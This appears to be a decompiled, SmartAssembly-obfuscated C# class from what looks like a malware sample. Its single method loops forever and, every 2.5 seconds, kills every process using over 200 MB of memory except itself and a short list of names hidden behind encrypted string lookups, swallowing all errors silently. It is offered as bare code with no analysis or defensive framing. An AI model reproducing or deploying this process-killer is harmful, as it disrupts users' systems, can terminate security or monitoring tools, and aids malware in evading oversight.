using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace nVxbvhuaKzC;

public static class OXcMFdshPo
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void lJiGxtXvuzRnxUQl()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107407129)) && !process.ProcessName.Contains(getString_0(107407152)) && !process.ProcessName.Contains(getString_0(107407143)) && !process.ProcessName.Contains(getString_0(107407102)) && !process.ProcessName.Contains(getString_0(107407121)) && !process.ProcessName.Contains(getString_0(107407108)) && !process.ProcessName.Contains(getString_0(107407575)) && !process.ProcessName.Contains(getString_0(107407594)) && !process.ProcessName.Contains(getString_0(107407549)) && !process.ProcessName.Contains(getString_0(107407568)) && !process.ProcessName.Contains(getString_0(107407515)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static OXcMFdshPo()
	{
		Strings.CreateGetStringDelegate(typeof(OXcMFdshPo));
	}
}
